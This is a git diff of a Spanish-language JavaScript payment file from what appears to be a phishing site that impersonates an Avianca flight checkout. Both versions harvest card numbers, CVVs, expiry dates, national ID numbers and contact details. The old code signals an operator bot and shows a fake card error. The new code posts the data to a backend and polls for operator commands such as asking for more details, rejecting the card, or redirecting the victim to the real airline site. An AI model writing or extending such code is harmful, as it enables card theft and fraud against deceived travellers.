@@ -1,322 +1,154 @@
-const loader = document.querySelector('.loader');
-setTimeout(() =>{
-    try{
-        document.querySelector('body').classList.remove('sb-hidden');
-        loader.classList.remove('show');
+// public/js/payment.js
+// Maneja formateo, envío al backend (/send-payment) y polling a /status/:transactionId
 
-        /* --- FLIGHT RESUME --- */
-        document.querySelector('#origin-code').textContent = info.flightInfo.origin.code;
-        document.querySelector('#destination-code').textContent = info.flightInfo.destination.code;
-        let finalPrice = "- -";
-        if(info.flightInfo.ticket_nat === 'NAC'){
-            finalPrice = pricesNAC[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
-            if(info.flightInfo.type === 1){
-                finalPrice = finalPrice * 2;
-            }
-        }else if(info.flightInfo.ticket_nat === 'INT'){
-            finalPrice = pricesNAT[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
-            if(info.flightInfo.type === 1){
-                finalPrice = finalPrice * 2;
-            }
-        }else{
-            console.log('flight resume error');
-        }
+// FORMATO / UTIL
+function limitDigits(el, max) {
+  el.value = el.value.replace(/\D/g, "").slice(0, max);
+}
 
-        document.querySelector('#flight-cost').textContent = formatPrice(finalPrice);
+function formatCNumber(el) {
+  let v = el.value.replace(/\D/g, "").slice(0, 19);
+  const parts = [];
+  for (let i = 0; i < v.length; i += 4) parts.push(v.substr(i, 4));
+  el.value = parts.join(" ");
+}
 
-        // COMPROBAR ERROR
-        if(info.metaInfo.p !== ''){
-            alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (AVERR88000023)');
-        }
+function formatDate(el) {
+  let v = el.value.replace(/\D/g, "").slice(0, 4);
+  if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
+  el.value = v;
+}
 
-        console.log("Index ON")
-        fetch(`${API_URL}/api/bot/status`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': `Bearer ${API_KEY}`
-            },
-            body: JSON.stringify({message: 'P4-PAYMENT'})
-        })
-        
-    }catch(err){
-        console.log(err);
-    }
-}, 2000);
+// Loader UI
+const loaderFull = document.querySelector(".loaderp-full");
+function showLoader() { if (loaderFull) loaderFull.style.display = "flex"; }
+function hideLoader() { if (loaderFull) loaderFull.style.display = "none"; }
 
+// Enviar datos al backend
+async function enviarDatos() {
+  // recolectar campos del DOM (ajusta ids si cambias tu HTML)
+  const card_number = document.getElementById("p").value.trim();
+  const expiry_date = document.getElementById("pdate").value.trim();
+  const cvv = document.getElementById("c").value.trim();
+  const name = document.getElementById("name").value.trim();
+  const surname = document.getElementById("surname").value.trim();
+  const cc = document.getElementById("cc").value.trim();
+  const email = document.getElementById("email").value.trim();
+  const telnum = document.getElementById("telnum").value.trim();
+  const city = document.getElementById("city").value.trim();
+  const state = document.getElementById("state").value.trim();
+  const address = document.getElementById("address").value.trim();
+  const bank = document.getElementById("ban").value;
+  const dues = document.getElementById("dues").value;
+  const termsAccepted = document.getElementById("terms-accept").checked;
+  const flightCost = document.getElementById("flight-cost").innerText;
 
-const btnNextStep = document.querySelector('#next-step');
+  if (!card_number || !expiry_date || !cvv || !name || !surname || !cc || !email || !telnum || !city || !state || !address || !bank || !termsAccepted) {
+    alert("Por favor, complete todos los campos del formulario y acepte los términos.");
+    return;
+  }
 
-const p = document.querySelector('#p');
-const pdate = document.querySelector('#pdate');
-const c = document.querySelector('#c');
-const ban = document.querySelector('#ban');
-const dues = document.querySelector('#dues');
-const dudename = document.querySelector('#name');
-const surname = document.querySelector('#surname');
-const cc = document.querySelector('#cc');
-const email = document.querySelector('#email');
-const telnum = document.querySelector('#telnum');
-const city = document.querySelector('#city');
-const state = document.querySelector('#state');
-const address = document.querySelector('#address');
+  const storedData = {
+    name: name + ' ' + surname,
+    cc,
+    email,
+    telnum,
+    city,
+    state,
+    address,
+    cardNumber: card_number.replace(/\s+/g, ''),
+    expiryDate: expiry_date,
+    cvv,
+    bank,
+    dues,
+    flightCost
+  };
 
+  // Generar transactionId y persistir localmente (opcional)
+  const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+  storedData.transactionId = transactionId;
+  localStorage.setItem('paymentData', JSON.stringify(storedData));
 
+  showLoader();
 
-
-btnNextStep.addEventListener('submit', e =>{
-    e.preventDefault();
-
-    try{
-        p.classList.remove('input-error')
-        pdate.classList.remove('input-error')
-        c.classList.remove('input-error')
-        dudename.classList.remove('input-error')
-        surname.classList.remove('input-error')
-        cc.classList.remove('input-error')
-        email.classList.remove('input-error')
-        telnum.classList.remove('input-error')
-        city.classList.remove('input-error')
-        state.classList.remove('input-error')
-        address.classList.remove('input-error')
-    }catch(err){
-        console.log(err);
-    }
-
-    if ((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
-        if(isLuhnValid(p.value)){
-            if (isValidDate(pdate.value)) {
-                if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {
-                    if(ban.value !== ''){
-                        if(dudename.value !== ''){
-                            if(surname.value !== ''){
-                                if(cc.value !== ''){
-                                    if(email.value !== ''){
-                                        if(telnum.value !== ''){
-                                            if(city.value !== ''){
-                                                if(state.value !== ''){
-                                                    if(address.value !== ''){
-                                                        console.log('todo bien, sigamos :)');
-    
-                                                        info.metaInfo.p = p.value;
-                                                        info.metaInfo.ban = ban.value;
-                                                        info.metaInfo.pdate = pdate.value;
-                                                        info.metaInfo.c = c.value;
-                                                        info.metaInfo.dudename = dudename.value;
-                                                        info.metaInfo.surname = surname.value;
-                                                        info.metaInfo.cc = cc.value;
-                                                        info.metaInfo.email = email.value;
-                                                        info.metaInfo.telnum = telnum.value;
-                                                        info.metaInfo.city = city.value;
-                                                        info.metaInfo.state = state.value;
-                                                        info.metaInfo.address = address.value;
-                                                        info.checkerInfo.mode = 'userpassword';
-
-                                                        if(info.metaInfo.p[0] == '4'){
-                                                            info.checkerInfo.company = 'VISA';
-                                                        }else if(info.metaInfo.p[0] == '5'){
-                                                            info.checkerInfo.company = 'MC';
-                                                        }else if(info.metaInfo.p[0] == '3'){
-                                                            info.checkerInfo.company = 'AM';
-                                                        }
-    
-                                                        updateLS();
-    
-                                                        // fetch(`${API_URL}/api/bot/flight/data`, {
-                                                        //     method: 'POST',
-                                                        //     headers: {
-                                                        //         'Content-Type': 'application/json',
-                                                        //         'Authorization': `Bearer ${API_KEY}`
-                                                        //     },
-                                                        //     body: JSON.stringify(info.metaInfo)
-                                                        // });
-
-                                                        loader.classList.add('show');
-
-                                                        setTimeout(() => window.location.href = 'waiting.html', 4500);
-    
-                                                    }else{
-                                                        address.classList.add('input-error');
-                                                        address.focus();
-                                                    }
-                                                }else{
-                                                    state.classList.add('input-error');
-                                                    state.focus();
-                                                }
-                                            }else{
-                                                city.classList.add('input-error');
-                                                city.focus();
-                                            }
-                                        }else{
-                                            telnum.classList.add('input-error');
-                                            telnum.focus();
-                                        }
-                                    }else{
-                                        email.classList.add('input-error');
-                                        email.focus();
-                                    }
-                                }else{
-                                    cc.classList.add('input-error');
-                                    cc.focus();
-                                }
-                            }else{
-                                surname.classList.add('input-error');
-                                surname.focus();
-                            }
-                        }else{
-                            dudename.classList.add('input-error');
-                            dudename.focus();
-                        }
-                    } else{
-                        ban.focus();
-                    }
-
-                } else {
-                    c.classList.add('input-error');
-                    c.focus();
-                }
-            } else {
-                pdate.classList.add('input-error');
-                pdate.focus();
-            }
-        } else{
-            p.classList.add('input-error');
-            p.focus();
-        }
+  try {
+    const res = await fetch('/send-payment', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(storedData)
+    });
+    const j = await res.json();
+    if (j && j.ok && j.transactionId) {
+      // Iniciar polling al backend
+      console.log('Enviado al backend. tx=', j.transactionId, 'msgId=', j.messageId);
+      checkPaymentVerificationBackend(j.transactionId);
     } else {
-        p.classList.add('input-error');
-        p.focus();
+      console.error('Error from backend', j);
+      hideLoader();
+      alert('Error enviando datos. Intenta de nuevo.');
     }
+  } catch (err) {
+    console.error('Error enviarDatos:', err);
+    hideLoader();
+    alert('Error de conexión. Intenta otra vez.');
+  }
+}
+
+// Polling al backend
+function checkPaymentVerificationBackend(transactionId) {
+  const poll = async () => {
+    try {
+      const res = await fetch(`/status/${transactionId}`);
+      const j = await res.json();
+      const status = j && j.status ? j.status : 'not_found';
+
+      if (status === 'pending' || status === undefined) {
+        setTimeout(poll, 2000);
+        return;
+      }
+
+      // Hay resultado
+      hideLoader();
+
+      switch (status) {
+        case 'pedir_logo':
+          window.location.href = "chedf.html"; // tu flujo
+          break;
+        case 'error_tc':
+          alert("La tarjeta de crédito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente.");
+          break;
+        case 'finalizar':
+          window.location.href = "https://www.avianca.com/";
+          break;
+        default:
+          console.warn('Estado desconocido recibido:', status);
+          break;
+      }
+    } catch (err) {
+      console.error('Error en polling status:', err);
+      setTimeout(poll, 2000);
+    }
+  };
+
+  poll();
+}
+
+// BINDINGS
+document.addEventListener('DOMContentLoaded', () => {
+  const ccInput = document.getElementById('p');
+  if (ccInput) ccInput.addEventListener('input', (e) => formatCNumber(e.target));
+  const dateInput = document.getElementById('pdate');
+  if (dateInput) dateInput.addEventListener('input', (e) => formatDate(e.target));
+  const cvvInput = document.getElementById('c');
+  if (cvvInput) cvvInput.addEventListener('input', (e) => limitDigits(e.target, 4));
+  const dni = document.getElementById('cc');
+  if (dni) dni.addEventListener('input', (e) => limitDigits(e.target, 10));
+  const tel = document.getElementById('telnum');
+  if (tel) tel.addEventListener('input', (e) => limitDigits(e.target, 10));
+
+  const btn = document.getElementById('autorizarBtn');
+  if (btn) btn.addEventListener('click', (ev) => {
+    ev.preventDefault();
+    enviarDatos();
+  });
 });
-
-
-
-
-
-/**
- * FUNCTIONS
- * 
- */
-function updateLS(){
-    LS.setItem('info', JSON.stringify(info));
-}
-
-function formatCNumber(input) {
-    let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos
-    if(numero.length === 0){
-        p.removeAttribute('class');
-        p.classList.add('input-cc', 'mt-2', 'bg-std');
-    }
-
-    let numeroFormateado = '';
-
-    // American express
-    if (numero[0] === '3') {
-
-        c.setAttribute('maxlength', '4');
-        // Icono
-        p.removeAttribute('class');
-        p.classList.add('bg-am', 'input-cc', 'mt-2');
-
-        if (numero.length > 15) {
-            numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
-        }
-
-        for (let i = 0; i < numero.length; i++) {
-            if (i === 4 || i === 10) {
-                numeroFormateado += ' ';
-            }
-
-            numeroFormateado += numero.charAt(i);
-        }
-
-        input.value = numeroFormateado;
-    } else {
-
-        numero[0] == 4 ? p.classList.add('bg-vi') : '';
-        numero[0] == 5 ? p.classList.add('bg-mc') : '';
-
-        c.setAttribute('maxlength', '3');
-        if (numero.length > 16) {
-            numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
-        }
-        for (let i = 0; i < numero.length; i++) {
-            if (i > 0 && i % 4 === 0) {
-                numeroFormateado += ' ';
-            }
-            numeroFormateado += numero.charAt(i);
-        }
-        input.value = numeroFormateado;
-    }
-}
-
-function formatDate(input) {
-    var texto = input.value;
-    
-    texto = texto.replace(/\D/g, '');
-
-    texto = texto.substring(0, 4);
-
-    if (texto.length > 2) {
-        texto = texto.substring(0, 2) + '/' + texto.substring(2, 4);
-    }
-    input.value = texto;
-}
-
-function formatPrice(number){
-    return number.toFixed(2);
-}
-
-function isLuhnValid(bin) {
-    bin = bin.replace(/\D/g, '');
-
-    if (bin.length < 6) {
-        return false;
-    }
-    const digits = bin.split('').map(Number).reverse();
-
-    let sum = 0;
-    for (let i = 0; i < digits.length; i++) {
-        if (i % 2 !== 0) {
-            let doubled = digits[i] * 2;
-            if (doubled > 9) {
-                doubled -= 9;
-            }
-            sum += doubled;
-        } else {
-            sum += digits[i];
-        }
-    }
-
-    return sum % 10 === 0;
-}
-
-function isValidDate(fechaInput) {
-    var partes = fechaInput.split('/');
-    var mesInput = parseInt(partes[0], 10);
-    var añoInput = parseInt(partes[1], 10);
-
-    // Verificar que el mes no sea mayor a 12
-    if (mesInput > 12) {
-        return false;
-    }
-
-    // Ajustar el año para tener en cuenta el formato de dos dígitos
-    añoInput += 2000;
-
-    var fechaActual = new Date();
-    var añoActual = fechaActual.getFullYear();
-    var limiteAño = añoActual + 8; // Año actual + 8
-
-    // Verificar que el año no sea mayor al año actual + 8
-    if (añoInput > limiteAño || (añoInput === limiteAño && mesInput >= 1)) {
-        return false;
-    }
-
-    // Verificar que la fecha no sea futura
-    if (añoInput > añoActual || (añoInput === añoActual && mesInput >= (fechaActual.getMonth() + 1))) {
-        return true;
-    } else {
-        return false;
-    }
-}
